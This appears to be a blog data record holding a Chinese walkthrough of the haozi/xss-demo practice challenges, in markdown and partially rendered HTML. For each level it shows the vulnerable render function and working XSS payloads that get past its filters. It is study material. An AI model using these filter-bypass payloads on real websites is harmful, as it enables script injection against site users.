`<article>${input}</article>`\n}\n```\n\n## 分析:\n\n```\n过滤了<>包含的所有内容并替换成空,利用浏览器兼容性绕过\n```\n\n## input code:\n\n```\n1. \n<img src='' onerror=alert`1`\n     //这里有个换行\n```\n\n## html:\n\n```\n1. <input value=1 type='image' src='' onerror\n=alert(1) type=\"text\">\n\n```\n\n![007](/img/xss/haozi/007.png)\n\n# 0x08\n\n## server code:\n\n```\nfunction render (src) {\n  src = src.replace(/<\\/style>/ig, '/* \\u574F\\u4EBA */')\n  return `\n    <style>\n      ${src}\n    </style>\n  `\n}\n```\n\n## 分析:\n\n```\n过滤了</style>的大小写。如果输入了</style>会被替换成/* 坏人 */。通过换行绕过<style>即可。\n```\n\n## input code:\n\n```\n1. \n</style\n       ><img src='' onerror=alert`1`>\n\n```\n\n## html:\n\n```\n1. <style>\n      </style\n       ><img src='' onerror=alert`1`>\n    </style>\n\n```\n\n![008](/img/xss/haozi/008.png)\n\n# 0x09\n\n## server code:\n\n```\nfunction render (input) {\n  let domainRe = /^https?:\\/\\/www\\.segmentfault\\.com/\n  if (domainRe.test(input)) {\n    return `<script src=\"${input}\"></script>`\n  }\n  return 'Invalid URL'\n}\n```\n\n## 分析:\n\n```\n用正则表达式匹配'https(http)://www.segmentfault.com',构造闭合即可。\n```\n\n## input code:\n\n```\n1. \nhttps://www.segmentfault.com\"></script><script>alert(1)</script>\n\n```\n\n## html:\n\n```\n1. <script src=\"https://www.segmentfault.com\"></script><script>alert(1)</script>\"></script>\n\n```\n\n![009](/img/xss/haozi/009.png)\n\n# 0x0A\n\n## server code:\n\n```\nfunction render (input) {\n  function escapeHtml(s) {\n    return s.replace(/&/g, '&amp;')\n            .replace(/'/g, '&#39;')\n            .replace(/\"/g, '&quot;')\n            .replace(/</g, '&lt;')\n            .replace(/>/g, '&gt;')\n            .replace(/\\//g, '&#x2f')\n  }\n\n  const domainRe = /^https?:\\/\\/www\\.segmentfault\\.com/\n  if (domainRe.test(input)) {\n    return `<script src=\"${escapeHtml(input)}\"></script>`\n  }\n  return 'Invalid URL'\n}\n```\n\n## 分析:\n\n```\n用正则表达式匹配'https(http)://www.segmentfault.com',用html实体替换&'\"<>\\。\n1.利用url中的@引用js\n2.直接在给定的网址https://www.segmentfault.com 注册账号，新建一个笔记，内容为alert(1)，再调用这个笔记链接即可，需要换行\n```\n\n## input code:\n\n```\n1. https://www.segmentfault.com@xss.haozi.me/j.js\n2. https://www.segmentfault.com/n/\n1330000016631643/raw （这一行换行）\n\n```\n\n## html:\n\n```\n1. <script src=\"https:&#x2f&#x2fwww.segmentfault.com@xss.haozi.me&#x2fj.js\"></script>\n2. <script src=\"https:&#x2f&#x2fwww.segmentfault.com&#x2fn&#x2f\n1330000016631643&#x2fraw\"></script>\n```\n\n![00A](/img/xss/haozi/00A.png)\n\n# 0x0B\n\n## server code:\n\n```\nfunction render (input) {\n  input = input.toUpperCase()\n  return `<h1>${input}</h1>`\n}\n```\n\n## 分析:\n\n```\n将输入的数据用toUpperCase进行了大写转换。可以利用html 标签, 域名 不区分大小写的方式来攻克。\n1.引用外部链接解决\n```\n\n## input code:\n\n```\n1. \n<script src=\"https://xss.haozi.me/j.js\"></script>\n\n\n```\n\n## html:\n\n```\n1. <h1><SCRIPT SRC=\"HTTPS://XSS.HAOZI.ME/J.JS\"></SCRIPT>\n</h1>\n```\n\n![00B](/img/xss/haozi/00B.png)\n\n# 0x0C\n\n## server code:\n\n```\nfunction render (input) {\n  input = input.replace(/script/ig, '')\n  input = input.toUpperCase()\n  return '<h1>' + input + '</h1>'\n}\n```\n\n## 分析:\n\n```\n首先将script不论大小写用空替换,并将输入的数据用toUpperCase进行了大写转换。绕过script过滤后利用html 标签, 域名 不区分大小写的方式来攻克。\n1.引用外部链接解决\n```\n\n## input code:\n\n```\n1. <scscriptript src=\"https://xss.haozi.me/j.js\"></scscriptript>\n\n\n```\n\n## html:\n\n```\n1. <h1><SCRIPT SRC=\"HTTPS://XSS.HAOZI.ME/J.JS\"></SCRIPT></h1>\n```\n\n![00C](/img/xss/haozi/00C.png)\n\n# 0x0D\n\n## server code:\n\n```\nfunction render (input) {\n  input = input.replace(/[</\"']/g, '')\n  return `\n    <script>\n          // alert('${input}')\n    </script>\n  `\n}\n```\n\n## 分析:\n\n```\n过滤了</\"',并用//单行注释,但是可以换行绕过过滤,使用html注释-->来注释后面的js，使代码正常运行。\n```\n\n## input code:\n\n```\n1.\n//这一行换行\nalert(`1`)\n-->\n\n\n```\n\n## html:\n\n```\n1. \n<script>\n          // alert('\nalert(`1`)\n-->')\n```\n\n![00D](/img/xss/haozi/00D.png)\n\n# 0x0E\n\n## server code:\n\n```\nfunction render (input) {\n  input = input.replace(/<([a-zA-Z])/g, '<_$1')\n  input = input.toUpperCase()\n  return '<h1>' + input + '</h1>'\n}\n```\n\n## 分析:\n\n```\n将<后的第一个字符变成了_字符,导致<script>变成<_script>,有个特殊ſ 字符,是古英语中的s的写法, 转成大写是正常的S。\n```\n\n## input code:\n\n```\n1.<ſcript src=\"https://xss.haozi.me/j.js\"></script>\n\n\n```\n\n## html:\n\n```\n1. <h1><SCRIPT SRC=\"HTTPS://XSS.HAOZI.ME/J.JS\"></SCRIPT></h1>\n```\n\n![00E](/img/xss/haozi/00E.png)\n\n# 0x0F\n\n## server code:\n\n```\nfunction render (input) {\n  function escapeHtml(s) {\n    return s.replace(/&/g, '&amp;')\n            .replace(/'/g, '&#39;')\n            .replace(/\"/g, '&quot;')\n            .replace(/</g, '&lt;')\n            .replace(/>/g, '&gt;')\n            .replace(/\\//g, '&#x2f;')\n  }\n  return `<img src onerror=\"console.error('${escapeHtml(input)}')\">`\n}\n```\n\n## 分析:\n\n```\n对html inline js 转义就是做无用功，浏览器会先解析html, 然后再解析 js。构造闭合就行。\n```\n\n## input code:\n\n```\n1.');alert('1\n\n\n```\n\n## html:\n\n```\n1. <img src onerror=\"console.error('&#39;);alert(&#39;1')\">\n```\n\n![00F](/img/xss/haozi/00F.png)\n\n# 0x10\n\n## server code:\n\n```\nfunction render (input) {\n  return `\n<script>\n  window.data = ${input}\n</script>\n  `\n}\n```\n\n## 分析:\n\n```\n用；拆分加上alert(1)就行。\n```\n\n## input code:\n\n```\n1. 123;alert(1)\n\n\n```\n\n## html:\n\n```\n1.  \n<script>\n  window.data = 123;alert(1)\n</script>\n```\n\n![010](/img/xss/haozi/010.png)\n\n# 0x11\n\n## server code:\n\n```\n// from alf.nu\nfunction render (s) {\n  function escapeJs (s) {\n    return String(s)\n            .replace(/\\\\/g, '\\\\\\\\')\n            .replace(/'/g, '\\\\\\'')\n            .replace(/\"/g, '\\\\\"')\n            .replace(/`/g, '\\\\`')\n            .replace(/</g, '\\\\74')\n            .replace(/>/g, '\\\\76')\n            .replace(/\\//g, '\\\\/')\n            .replace(/\\n/g, '\\\\n')\n            .replace(/\\r/g, '\\\\r')\n            .replace(/\\t/g, '\\\\t')\n            .replace(/\\f/g, '\\\\f')\n            .replace(/\\v/g, '\\\\v')\n            // .replace(/\\b/g, '\\\\b')\n            .replace(/\\0/g, '\\\\0')\n  }\n  s = escapeJs(s)\n  return `\n<script>\n  var url = 'javascript:console.log(\"${s}\")'\n  var a = document.createElement('a')\n  a.href = url\n  document.body.appendChild(a)\n  a.click()\n</script>\n`\n}\n```\n\n## 分析:\n\n```\n将\"替代\\\",构造闭合绕过,这里的坑是它替代的\\需要手动加一个、\n因为\" 被转义成 \\\" 经过html 解析后 console.log(\"\\\")会报语法错误, 再补个 \\ 即可\n```\n\n## input code:\n\n```\n1. \"),alert(\"1\n\n\n```\n\n## html:\n\n```\n1.  \n<script>\n  var url = 'javascript:console.log(\"\\\"),alert(\\\"1\")'\n  var a = document.createElement('a')\n  a.href = url\n  document.body.appendChild(a)\n  a.click()\n</script>\n```\n\n![011](/img/xss/haozi/011.png)\n\n# 0x12\n\n## server code:\n\n```\n// from alf.nu\nfunction escape (s) {\n  s = s.replace(/\"/g, '\\\\\"')\n  return '<script>console.log(\"' + s + '\");</script>'\n}\n```\n\n## 分析:\n\n```\n构造闭合\n1. 可以用”)闭合console.log(\",后利用注释\n2. 用</script>闭合<script>\n```\n\n## input code:\n\n```\n1. \\\");alert(1)<!-- 或 \\\");alert(1)//\n2. \n</script>\n<script>alert(1)</script>\n<script>\n\n\n```\n\n## html:\n\n```\n1.  \n<script>console.log(\"\\\\\");alert(`1`);<!--\");</script>\n2.\n<script>console.log(\"</script>\n<script>alert(1)</script>\n<script>\");</script>\n```\n\n![012](/img/xss/haozi/012.png)","source":"_posts/haozi-xss-demo笔记.md","raw":"---\ntitle: haozi/xss-demo笔记\ndate: 2018-10-08 21:59:54\ntags: XSS\ncategories: XSS\n---\n\n# haozi/xss-demo笔记\n\n在线xss题目,用于xss学习,弹出alert(1)就过关.\n\n地址:https://xss.haozi.me\n\n项目: https://github.com/haozi/xss-demo ,有提供的答案https://github.com/haozi/xss-demo/issues/1\n\n自带alert(1)的js地址：https://xss.haozi.me/j.js\n\n# 0x00\n\n## server code:\n\n```\nfunction render (input) {\n  return '<div>' + input + '</div>'\n}\n```\n\n## 分析:\n\n```\n没有过滤,在<div>标签中输出\n```\n\n## input code:\n\n\n\n```\n1. <script>alert('1')</script>\n\n2. <script>alert`1`</script>\n\n3. 利用外联方式 \n<script src=https://xss.haozi.me/j.js></script>   \n\n4. 利用onerror事件,当src寻找的资源不存在发送错误弹框。\n<img src='' onerror='alert(1)'>\n\n5.  利用html的字符实体和SVG。\n    SVG意为可缩放矢量图形（Scalable Vector Graphics）。\n    SVG 使用 XML 格式定义图像。\n   <svg><script>alert&#x28;1&#x29;</script></svg>\n\n```\n\n## html:\n\n```\n   1. <div><script>alert('1')</script></div>\n   2. <div><script>alert`1`</script></div>\n   3. <div><script src=https://xss.haozi.me/j.js></script></div>\n   4. <div><img src='' onerror='alert(1)'></div>\n   5. <div><svg><script>alert&#x28;1&#x29;</script></svg></div>\n```\n\n![000](/img/xss/haozi/000.png)\n\n#  0x01\n\n## server code:\n\n```\nfunction render (input) {\n  return '<textarea>' + input + '</textarea>'\n}\n```\n\n## 分析:\n\n```\n在<textarea>中,没有过滤,构造闭合\n```\n\n## input code:\n\n```\n1. </textarea><script>alert('1')</script>\n```\n\n\n## html:\n\n ```\n1. <textarea></textarea><script>alert('1')</script></textarea>\n ```\n\n![001](/img/xss/haozi/001.png)\n\n# 0x02\n\n## server code:\n\n```\nfunction render (input) {\n  return '<input type=\"name\" value=\"' + input + '\">'\n}\n```\n\n## 分析:\n\n```\n在<input>中,没有过滤,双引号闭合,构造双引号闭合\n```\n\n## input code:\n\n```\n1. \"><script>alert('1')</script>\n```\n\n## html:\n\n```\n1. <input type=\"name\" value=\"\"><script>alert('1')</script>\">\n```\n\n\n\n![002](/img/xss/haozi/002.png)\n\n# 0x03\n\n## server code:\n\n```\nfunction render (input) {\n  const stripBracketsRe = /[()]/g\n  input = input.replace(stripBracketsRe, '')\n  return input\n}\n```\n\n## 分析:\n\n```\n过滤了(),想办法用其他方式代替()\n```\n\n## input code:\n\n```\n1. <script>alert`1`</script>\n2. \n    利用html的字符实体和SVG。\n    SVG意为可缩放矢量图形（Scalable Vector Graphics）。\n    SVG 使用 XML 格式定义图像。\n    <svg><script>alert&#x28;1&#x29;</script></svg>\n 3. 利用外联\n <script src=https://xss.haozi.me/j.js></script>\n 4. 利用img标签,结合onerrors事件,src资源不存在会触发错误。 \n <img src='' onerror=\"alert&#x28;&#x31;&#x29;\">\n \n\n```\n\n## html:\n\n```\n1. <script>alert`1`</script>\n2. <svg><script>alert&#x28;1&#x29;</script></svg>\n3. <script src=https://xss.haozi.me/j.js></script>\n4. <img src='' onerror=\"alert&#x28;&#x31;&#x29;\">\n```\n\n![003](/img/xss/haozi/003.png)\n\n# 0x04\n\n## server code:\n\n```\nfunction render (input) {\n  const stripBracketsRe = /[()`]/g\n  input = input.replace(stripBracketsRe, '')\n  return input\n}\n```\n\n## 分析:\n\n```\n多过滤了`\n```\n\n## input code:\n\n```\n1. \n    利用html的字符实体和SVG。\n    SVG意为可缩放矢量图形（Scalable Vector Graphics）。\n    SVG 使用 XML 格式定义图像。\n    <svg><script>alert&#x28;1&#x29;</script></svg>\n 2. 利用外联\n <script src=https://xss.haozi.me/j.js></script>\n 3. 利用img标签,结合onerrors事件,src资源不存在会触发错误。 \n <img src='' onerror=\"alert&#x28;&#x31;&#x29;\">\n \n\n```\n\n## html:\n\n```\n1. <svg><script>alert&#x28;1&#x29;</script></svg>\n2. <script src=https://xss.haozi.me/j.js></script>\n3. <img src='' onerror=\"alert&#x28;&#x31;&#x29;\">\n```\n\n\n\n![004](/img/xss/haozi/004.png)\n\n# 0x05\n\n## server code:\n\n```\nfunction render (input) {\n  input = input.replace(/-->/g, '😂')\n  return '<!-- ' + input + ' -->'\n}\n```\n\n## 分析:\n\n```\n构造闭合\n```\n\n## input code:\n\n```\n1. --!><script>alert(1)</script>\n\n```\n\n## html:\n\n```\n1. <!-- --!><script>alert(1)</script> -->\n```\n\n![005](/img/xss/haozi/005.png)\n\n# 0x06\n\n## server code:\n\n```\nfunction render (input) {\n  input = input.replace(/auto|on.*=|>/ig, '_')\n  return `<input value=1 ${input} type=\"text\">`\n}\n```\n\n## 分析:\n\n```\n过滤>和以auto开头或者on开头，=等号结尾的标签属性并替换成_，且忽略大小写；\n\n1. 可以先定义type='image',等价于img标签的方法了。 然后利用换行使=与onerror隔开\n2. 用on开头的触发事件\n```\n\n## input code:\n\n```\n1. \ntype='image' src='' onerror\n=alert(1)\n\n2.onmouseover\n=alert(1)\n\n```\n\n## html:\n\n```\n1. <input value=1 type='image' src='' onerror\n=alert(1) type=\"text\">\n2.<input value=1 onmouseover\n=alert(1) type=\"text\">\n```\n\n![006](/img/xss/haozi/006.png)\n\n# 0x07\n\n## server code:\n\n```\nfunction render (input) {\n  const stripTagsRe = /<\\/?[^>]+>/gi\n\n  input = input.replace(stripTagsRe, '')\n  return `<article>${input}</article>`\n}\n```\n\n## 分析:\n\n```\n过滤了<>包含的所有内容并替换成空,利用浏览器兼容性绕过\n```\n\n## input code:\n\n```\n1. \n<img src='' onerror=alert`1`\n     //这里有个换行\n```\n\n## html:\n\n```\n1. <input value=1 type='image' src='' onerror\n=alert(1) type=\"text\">\n\n```\n\n![007](/img/xss/haozi/007.png)\n\n# 0x08\n\n## server code:\n\n```\nfunction render (src) {\n  src = src.replace(/<\\/style>/ig, '/* \\u574F\\u4EBA */')\n  return `\n    <style>\n      ${src}\n    </style>\n  `\n}\n```\n\n## 分析:\n\n```\n过滤了</style>的大小写。如果输入了</style>会被替换成/* 坏人 */。通过换行绕过<style>即可。\n```\n\n## input code:\n\n```\n1. \n</style\n       ><img src='' onerror=alert`1`>\n\n```\n\n## html:\n\n```\n1. <style>\n      </style\n       ><img src='' onerror=alert`1`>\n    </style>\n\n```\n\n![008](/img/xss/haozi/008.png)\n\n# 0x09\n\n## server code:\n\n```\nfunction render (input) {\n  let domainRe = /^https?:\\/\\/www\\.segmentfault\\.com/\n  if (domainRe.test(input)) {\n    return `<script src=\"${input}\"></script>`\n  }\n  return 'Invalid URL'\n}\n```\n\n## 分析:\n\n```\n用正则表达式匹配'https(http)://www.segmentfault.com',构造闭合即可。\n```\n\n## input code:\n\n```\n1. \nhttps://www.segmentfault.com\"></script><script>alert(1)</script>\n\n```\n\n## html:\n\n```\n1. <script src=\"https://www.segmentfault.com\"></script><script>alert(1)</script>\"></script>\n\n```\n\n![009](/img/xss/haozi/009.png)\n\n# 0x0A\n\n## server code:\n\n```\nfunction render (input) {\n  function escapeHtml(s) {\n    return s.replace(/&/g, '&amp;')\n            .replace(/'/g, '&#39;')\n            .replace(/\"/g, '&quot;')\n            .replace(/</g, '&lt;')\n            .replace(/>/g, '&gt;')\n            .replace(/\\//g, '&#x2f')\n  }\n\n  const domainRe = /^https?:\\/\\/www\\.segmentfault\\.com/\n  if (domainRe.test(input)) {\n    return `<script src=\"${escapeHtml(input)}\"></script>`\n  }\n  return 'Invalid URL'\n}\n```\n\n## 分析:\n\n```\n用正则表达式匹配'https(http)://www.segmentfault.com',用html实体替换&'\"<>\\。\n1.利用url中的@引用js\n2.直接在给定的网址https://www.segmentfault.com 注册账号，新建一个笔记，内容为alert(1)，再调用这个笔记链接即可，需要换行\n```\n\n## input code:\n\n```\n1. https://www.segmentfault.com@xss.haozi.me/j.js\n2. https://www.segmentfault.com/n/\n1330000016631643/raw （这一行换行）\n\n```\n\n## html:\n\n```\n1. <script src=\"https:&#x2f&#x2fwww.segmentfault.com@xss.haozi.me&#x2fj.js\"></script>\n2. <script src=\"https:&#x2f&#x2fwww.segmentfault.com&#x2fn&#x2f\n1330000016631643&#x2fraw\"></script>\n```\n\n![00A](/img/xss/haozi/00A.png)\n\n# 0x0B\n\n## server code:\n\n```\nfunction render (input) {\n  input = input.toUpperCase()\n  return `<h1>${input}</h1>`\n}\n```\n\n## 分析:\n\n```\n将输入的数据用toUpperCase进行了大写转换。可以利用html 标签, 域名 不区分大小写的方式来攻克。\n1.引用外部链接解决\n```\n\n## input code:\n\n```\n1. \n<script src=\"https://xss.haozi.me/j.js\"></script>\n\n\n```\n\n## html:\n\n```\n1. <h1><SCRIPT SRC=\"HTTPS://XSS.HAOZI.ME/J.JS\"></SCRIPT>\n</h1>\n```\n\n![00B](/img/xss/haozi/00B.png)\n\n# 0x0C\n\n## server code:\n\n```\nfunction render (input) {\n  input = input.replace(/script/ig, '')\n  input = input.toUpperCase()\n  return '<h1>' + input + '</h1>'\n}\n```\n\n## 分析:\n\n```\n首先将script不论大小写用空替换,并将输入的数据用toUpperCase进行了大写转换。绕过script过滤后利用html 标签, 域名 不区分大小写的方式来攻克。\n1.引用外部链接解决\n```\n\n## input code:\n\n```\n1. <scscriptript src=\"https://xss.haozi.me/j.js\"></scscriptript>\n\n\n```\n\n## html:\n\n```\n1. <h1><SCRIPT SRC=\"HTTPS://XSS.HAOZI.ME/J.JS\"></SCRIPT></h1>\n```\n\n![00C](/img/xss/haozi/00C.png)\n\n# 0x0D\n\n## server code:\n\n```\nfunction render (input) {\n  input = input.replace(/[</\"']/g, '')\n  return `\n    <script>\n          // alert('${input}')\n    </script>\n  `\n}\n```\n\n## 分析:\n\n```\n过滤了</\"',并用//单行注释,但是可以换行绕过过滤,使用html注释-->来注释后面的js，使代码正常运行。\n```\n\n## input code:\n\n```\n1.\n//这一行换行\nalert(`1`)\n-->\n\n\n```\n\n## html:\n\n```\n1. \n<script>\n          // alert('\nalert(`1`)\n-->')\n```\n\n![00D](/img/xss/haozi/00D.png)\n\n# 0x0E\n\n## server code:\n\n```\nfunction render (input) {\n  input = input.replace(/<([a-zA-Z])/g, '<_$1')\n  input = input.toUpperCase()\n  return '<h1>' + input + '</h1>'\n}\n```\n\n## 分析:\n\n```\n将<后的第一个字符变成了_字符,导致<script>变成<_script>,有个特殊ſ 字符,是古英语中的s的写法, 转成大写是正常的S。\n```\n\n## input code:\n\n```\n1.<ſcript src=\"https://xss.haozi.me/j.js\"></script>\n\n\n```\n\n## html:\n\n```\n1. <h1><SCRIPT SRC=\"HTTPS://XSS.HAOZI.ME/J.JS\"></SCRIPT></h1>\n```\n\n![00E](/img/xss/haozi/00E.png)\n\n# 0x0F\n\n## server code:\n\n```\nfunction render (input) {\n  function escapeHtml(s) {\n    return s.replace(/&/g, '&amp;')\n            .replace(/'/g, '&#39;')\n            .replace(/\"/g, '&quot;')\n            .replace(/</g, '&lt;')\n            .replace(/>/g, '&gt;')\n            .replace(/\\//g, '&#x2f;')\n  }\n  return `<img src onerror=\"console.error('${escapeHtml(input)}')\">`\n}\n```\n\n## 分析:\n\n```\n对html inline js 转义就是做无用功，浏览器会先解析html, 然后再解析 js。构造闭合就行。\n```\n\n## input code:\n\n```\n1.');alert('1\n\n\n```\n\n## html:\n\n```\n1. <img src onerror=\"console.error('&#39;);alert(&#39;1')\">\n```\n\n![00F](/img/xss/haozi/00F.png)\n\n# 0x10\n\n## server code:\n\n```\nfunction render (input) {\n  return `\n<script>\n  window.data = ${input}\n</script>\n  `\n}\n```\n\n## 分析:\n\n```\n用；拆分加上alert(1)就行。\n```\n\n## input code:\n\n```\n1. 123;alert(1)\n\n\n```\n\n## html:\n\n```\n1.  \n<script>\n  window.data = 123;alert(1)\n</script>\n```\n\n![010](/img/xss/haozi/010.png)\n\n# 0x11\n\n## server code:\n\n```\n// from alf.nu\nfunction render (s) {\n  function escapeJs (s) {\n    return String(s)\n            .replace(/\\\\/g, '\\\\\\\\')\n            .replace(/'/g, '\\\\\\'')\n            .replace(/\"/g, '\\\\\"')\n            .replace(/`/g, '\\\\`')\n            .replace(/</g, '\\\\74')\n            .replace(/>/g, '\\\\76')\n            .replace(/\\//g, '\\\\/')\n            .replace(/\\n/g, '\\\\n')\n            .replace(/\\r/g, '\\\\r')\n            .replace(/\\t/g, '\\\\t')\n            .replace(/\\f/g, '\\\\f')\n            .replace(/\\v/g, '\\\\v')\n            // .replace(/\\b/g, '\\\\b')\n            .replace(/\\0/g, '\\\\0')\n  }\n  s = escapeJs(s)\n  return `\n<script>\n  var url = 'javascript:console.log(\"${s}\")'\n  var a = document.createElement('a')\n  a.href = url\n  document.body.appendChild(a)\n  a.click()\n</script>\n`\n}\n```\n\n## 分析:\n\n```\n将\"替代\\\",构造闭合绕过,这里的坑是它替代的\\需要手动加一个、\n因为\" 被转义成 \\\" 经过html 解析后 console.log(\"\\\")会报语法错误, 再补个 \\ 即可\n```\n\n## input code:\n\n```\n1. \"),alert(\"1\n\n\n```\n\n## html:\n\n```\n1.  \n<script>\n  var url = 'javascript:console.log(\"\\\"),alert(\\\"1\")'\n  var a = document.createElement('a')\n  a.href = url\n  document.body.appendChild(a)\n  a.click()\n</script>\n```\n\n![011](/img/xss/haozi/011.png)\n\n# 0x12\n\n## server code:\n\n```\n// from alf.nu\nfunction escape (s) {\n  s = s.replace(/\"/g, '\\\\\"')\n  return '<script>console.log(\"' + s + '\");</script>'\n}\n```\n\n## 分析:\n\n```\n构造闭合\n1. 可以用”)闭合console.log(\",后利用注释\n2. 用</script>闭合<script>\n```\n\n## input code:\n\n```\n1. \\\");alert(1)<!-- 或 \\\");alert(1)//\n2. \n</script>\n<script>alert(1)</script>\n<script>\n\n\n```\n\n## html:\n\n```\n1.  \n<script>console.log(\"\\\\\");alert(`1`);<!--\");</script>\n2.\n<script>console.log(\"</script>\n<script>alert(1)</script>\n<script>\");</script>\n```\n\n![012](/img/xss/haozi/012.png)","slug":"haozi-xss-demo笔记","published":1,"updated":"2019-06-19T17:23:13.383Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istks009l4dsbdqpm5jr8","content":"<h1 id=\"haozi-xss-demo笔记\"><a href=\"#haozi-xss-demo笔记\" class=\"headerlink\" title=\"haozi/xss-demo笔记\"></a>haozi/xss-demo笔记</h1><p>在线xss题目,用于xss学习,弹出alert(1)就过关.</p>\n<p>地址:<a href=\"https://xss.haozi.me\" target=\"_blank\" rel=\"noopener\">https://xss.haozi.me</a></p>\n<p>项目: <a href=\"https://github.com/haozi/xss-demo\" target=\"_blank\" rel=\"noopener\">https://github.com/haozi/xss-demo</a> ,有提供的答案<a href=\"https://github.com/haozi/xss-demo/issues/1\" target=\"_blank\" rel=\"noopener\">https://github.com/haozi/xss-demo/issues/1</a></p>\n<p>自带alert(1)的js地址：<a href=\"https://xss.haozi.me/j.js\" target=\"_blank\" rel=\"noopener\">https://xss.haozi.me/j.js</a></p>\n<h1 id=\"0x00\"><a href=\"#0x00\" class=\"headerlink\" title=\"0x00\"></a>0x00</h1><h2 id=\"server-code\"><a href=\"#server-code\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span> <span class=\"params\">(input)</span></span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">'&lt;div&gt;'</span> + <span class=\"built_in\">input</span> + <span class=\"string\">'&lt;/div&gt;'</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">没有过滤,在&lt;<span class=\"keyword\">div</span>&gt;标签中输出</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"input-code\"><a href=\"#input-code\" class=\"headerlink\" title=\"input code:\"></a>input code:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"actionscript\">alert(<span class=\"string\">'1'</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">2. <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">alert<span class=\"string\">`1`</span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">3. 利用外联方式 </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">https://xss.haozi.me/j.js</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span>   </span><br><span class=\"line\"></span><br><span class=\"line\">4. 利用onerror事件,当src寻找的资源不存在发送错误弹框。</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">''</span> <span class=\"attr\">onerror</span>=<span class=\"string\">'alert(1)'</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">5.  利用html的字符实体和SVG。</span><br><span class=\"line\">    SVG意为可缩放矢量图形（Scalable Vector Graphics）。</span><br><span class=\"line\">    SVG 使用 XML 格式定义图像。</span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">svg</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">alert&amp;#x28;1&amp;#x29;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"html\"><a href=\"#html\" class=\"headerlink\" title=\"html:\"></a>html:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"actionscript\">alert(<span class=\"string\">'1'</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">2. <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">alert<span class=\"string\">`1`</span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">3. <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">https://xss.haozi.me/j.js</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">4. <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">''</span> <span class=\"attr\">onerror</span>=<span class=\"string\">'alert(1)'</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">5. <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">svg</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">alert&amp;#x28;1&amp;#x29;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/haozi/000.png\" alt=\"000\"></p>\n<h1 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h1><h2 id=\"server-code-1\"><a href=\"#server-code-1\" class=\"headerlink\" title=\"server code:\"></a>server code:</h2><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span 